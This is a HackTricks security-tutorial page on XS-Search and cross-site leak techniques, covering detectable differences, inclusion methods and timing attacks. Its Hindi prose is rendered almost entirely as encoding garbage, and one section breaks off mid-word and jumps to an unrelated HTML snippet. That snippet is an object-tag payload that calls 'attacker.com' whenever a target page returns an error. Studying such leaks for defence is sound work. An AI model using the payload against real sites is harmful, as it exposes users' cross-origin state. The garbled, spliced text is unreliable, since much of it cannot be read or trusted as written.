# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝ рдХреЛ рдСрдЯреЛрдореЗрдЯ** рдХрд░реЗрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## **рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**

XS-Search рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрдб рдЪреИрдирд▓ рдЕрдЯреИрдХреНрд╕** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИред

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЗ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рддрддреНрд╡ рд╣реЛрддреЗ рд╣реИрдВ:

* **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╡реЗрдм**: рд╡рд╣ рд╡реЗрдм рдЬрд╣рд╛рдВ рд╕реЗ рд╣рдо рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ
* **рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рд╡реЗрдм**: рд╡рд╣ рд╡реЗрдм рдЬрд┐рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕реЗ рдкреАрдбрд╝рд┐рдд рдПрдХреНрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ
* **рдЗрдирдХреНрд▓реВрдЬрди рдореЗрдердб**: рд╡рд╣ рд╡рд┐рдзрд┐ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╡реЗрдм рд╕реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╡реЗрдм рдХреЛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ window.open, iframe, fetch, href рдХреЗ рд╕рд╛рде HTML рдЯреИрдЧ...)
* **рд▓реАрдХ рддрдХрдиреАрдХ**: рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╡реЗрдм рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рдмрд╛рдж, рдЗрдирдХреНрд▓реВрдЬрди рдореЗрдердб рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рд╡реЗрдм рдХреА рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
* **рд╕реНрдерд┐рддрд┐рдпрд╛рдВ**: рд╡реЗ 2 рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐рдпрд╛рдВ рдЬреЛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╡реЗрдм рдХреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдо рдкреАрдбрд╝рд┐рдд рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдВрддрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рдпрд╣ рд╡рд╣ рдЬрд╛рдирдХрд╛рд░реА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╡реЗрдм рдХреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдирд┐рд░реНрдгрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИред

### рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░

рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рдХреА 2 рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЪреАрдЬреЛрдВ рдХреЛ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* **рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди **рд╡рд┐рднрд┐рдиреНрди HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реНрдерд┐рддрд┐ рдХреЛрдбреЛрдВ** рдХреЛ рдЕрдВрддрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐рдпрд╛рдВ, рдЧреНрд░рд╛рд╣рдХ рддреНрд░реБрдЯрд┐рдпрд╛рдВ, рдпрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рддреНрд░реБрдЯрд┐рдпрд╛рдВ)ред
* **API рдЙрдкрдпреЛрдЧ**ред рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреГрд╖реНрдареЛрдВ рдХреЗ рдмреАрдЪ **Web APIsтАЩ рдЙрдкрдпреЛрдЧ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдпрд╣ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреГрд╖реНрда рдПрдХ рд╡рд┐рд╢реЗрд╖ JavaScript Web API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред
* **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕**ред рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдпрджрд┐ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдкреГрд╖реНрда рдкрд░ **рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд┐рдпрд╛ рд╣реИ** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХреЗрд╡рд▓ HTTP рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕ рддрдХ рд╕реАрдорд┐рдд рдирд╣реАрдВ рд╣реИ рдмрд▓реНрдХрд┐ JavaScript рдпрд╛ HTML рджреНрд╡рд╛рд░рд╛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕ рдХреЛ рднреА рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред
* **рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА**ред рдпреЗ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп **рдЕрдВрддрд░ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╢рд░реАрд░** рдореЗрдВ рд╕реНрд╡рдпрдВ рдпрд╛ рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдП рдЧрдП рдЙрдк-рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ **рд╢рд╛рдорд┐рд▓ рдлреНрд░реЗрдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рд╣реЛ рд╕рдХрддреА рд╣реИ (cf. XS-Leak on Gitlab) рдпрд╛ рдЫрд╡рд┐рдпреЛрдВ рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдЕрдВрддрд░ред
* **HTTP рд╣реЗрдбрд░**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рд╡рд┐рд╢реЗрд╖ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░** рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдореВрд▓реНрдп рдХреЛ рдПрдХрддреНрд░ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ X-Frame-Options, Content-Disposition, рдФрд░ Cross-Origin-Resource-Policy рдЬреИрд╕реЗ рд╣реЗрдбрд░ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* **рд╕рдордп**: рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ 2 рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рдПрдХ рд╕реБрд╕рдВрдЧрдд рд╕рдордп рдЕрдВрддрд░ рдореМрдЬреВрдж рд╣реИред

### рдЗрдирдХреНрд▓реВрдЬрди рдореЗрдердб

* **HTML рддрддреНрд╡**ред HTML рд╡рд┐рднрд┐рдиреНрди рддрддреНрд╡ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рдЗрдирдХреНрд▓реВрдЬрди** рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВред рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯреНрд╕, рдЗрдореЗрдЬреЗрдЬ, рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдЬреИрд╕реЗ рддрддреНрд╡, рдкреАрдбрд╝рд┐рдд рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЧреИрд░-HTML рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд HTML рддрддреНрд╡реЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдСрдирд▓рд╛рдЗрди рдЙрдкрд▓рдмреНрдз рд╣реИ ([https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks))ред
* **рдлреНрд░реЗрдореНрд╕**ред рдЬреИрд╕реЗ **iframe**, **object**, рдФрд░ **embed** рддрддреНрд╡ рдЖрдЧреЗ HTML рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕реАрдзреЗ рд╣рдорд▓рд╛рд╡рд░ рдкреГрд╖реНрда рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдкреГрд╖реНрда **рдлреНрд░реЗрдорд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**, рддреЛ JavaScript рдХреЛрдб contentWindow рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлреНрд░реЗрдореНрдб рд╕рдВрд╕рд╛рдзрди рдХреА рд╡рд┐рдВрдбреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИред
* **рдкреЙрдк-рдЕрдкреНрд╕**ред **`window.open`** рдореЗрдердб рдПрдХ рдирдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЯреИрдм рдпрд╛ рд╡рд┐рдВрдбреЛ рдореЗрдВ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред рдореЗрдердб рдПрдХ **рд╡рд┐рдВрдбреЛ рд╣реИрдВрдбрд▓** рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ JavaScript рдХреЛрдб SOP рдХреЗ рдЕрдиреБрд░реВрдк рддрд░реАрдХреЛрдВ рдФрд░ рдЧреБрдгреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрдиреНрд╣реЗрдВ рдкреЙрдк-рдЕрдкреНрд╕ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЕрдХреНрд╕рд░ рдПрдХрд▓ рд╕рд╛рдЗрди-рдСрди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЖрдзреБрдирд┐рдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗрд╡рд▓ рддрднреА рдкреЙрдк-рдЕрдкреНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬрдм рд╡реЗ рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░реИрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред XS-Leak рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП, рдпрд╣ рдореЗрдердб рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рд╣рд╛рдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд▓рдХреНрд╖реНрдп рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдлреНрд░реЗрдорд┐рдВрдЧ рдФрд░ рдХреБрдХреА рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдирдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдиреЗ рд╣рд╛рд▓ рд╣реА рдореЗрдВ рд╡рд┐рдВрдбреЛ рд╣реИрдВрдбрд▓ рдХреЛ рдЕрд▓рдЧ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдЬреЛрдбрд╝реЗ рд╣реИрдВред
* **JavaScript рдЕрдиреБрд░реЛрдз**ред JavaScript рд▓рдХреНрд╖реНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕реАрдзреЗ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рджреЛ рдЕрд▓рдЧ-рдЕрд▓
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
```markdown
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрджрд┐ `example.com/404` рдирд╣реАрдВ рдорд┐рд▓рд╛ рддреЛ `attacker.com/?error` рд▓реЛрдб рд╣реЛрдЧрд╛ред

### Onload Timing

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Timing (рдЖрдорддреМрд░ рдкрд░ Page Content, Status Code рдХреЗ рдХрд╛рд░рдг)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **рд╕рд╛рд░рд╛рдВрд╢:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдЕрдиреБрд░реЛрдз рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рдБ рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) рдЬреЛ 50ms рд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рддрдХ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ рдХрд╛рд░реНрдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

рдпрд╣ рддрдХрдиреАрдХ рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдХреА рддрд░рд╣ рд╣реА рд╣реИ, рд▓реЗрдХрд┐рди **attacker** рдпрд╣ рднреА **force** рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреБрдЫ рдХреНрд░рд┐рдпрд╛ **relevant amount time** рд▓реЗрдЧреА рдЬрдм **answer positive or negative** рд╣реЛ рдФрд░ рдЙрд╕ рд╕рдордп рдХреЛ рдорд╛рдкреЗрдЧрд╛ред

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (рдЖрдорддреМрд░ рдкрд░ Page Content, Status Code рдХреЗ рдХрд╛рд░рдг)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **рд╕рд╛рд░рд╛рдВрд╢:** [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдЕрдиреБрд░реЛрдз рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рдБ рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

[`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) рдФрд░ [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) рдШрдЯрдирд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрд╕рд╛рдзрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд▓рдЧрдиреЗ рд╡рд╛рд▓реЗ рд╕рдордп рдХреЛ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`beforeunload`** рддрдм рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ **рдирдИ рдиреЗрд╡рд┐рдЧреЗрд╢рди** рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ **`unload`** рддрдм рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рд╡рд╣ **рдиреЗрд╡рд┐рдЧреЗрд╢рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЗ рдХрд╛рд░рдг, рдЗрди рджреЛ рдШрдЯрдирд╛рдУрдВ рдХреЗ рдмреАрдЪ рд╕рдордп рдЕрдВрддрд░ рдХреА рдЧрдгрдирд╛ рдХрд░рдХреЗ рдпрд╣ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╕рдВрд╕рд╛рдзрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрд╛**ред

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (рдЖрдорддреМрд░ рдкрд░ Page Content, Status Code рдХреЗ рдХрд╛рд░рдг)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **рд╕рд╛рд░рд╛рдВрд╢:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдЕрдиреБрд░реЛрдз рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рдБ рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

рдпрджрд┐ рдХрд┐рд╕реА рдкреГрд╖реНрда рдореЗрдВ [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд┐рдП рдЧрдП рд╣реИрдВ, рддреЛ рдПрдХ attacker рд╕рдордп рдорд╛рдк рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдкреГрд╖реНрда рдФрд░ рд╕рднреА рд╕рдмрд░рд┐рд╕реЛрд░реНрд╕реЗрдЬ рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд▓реЛрдб рд╣реЛрдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдПрдХ iframe рдХреЗ рд▓рд┐рдП `onload` рд╣реИрдВрдбрд▓рд░ рд╕рднреА 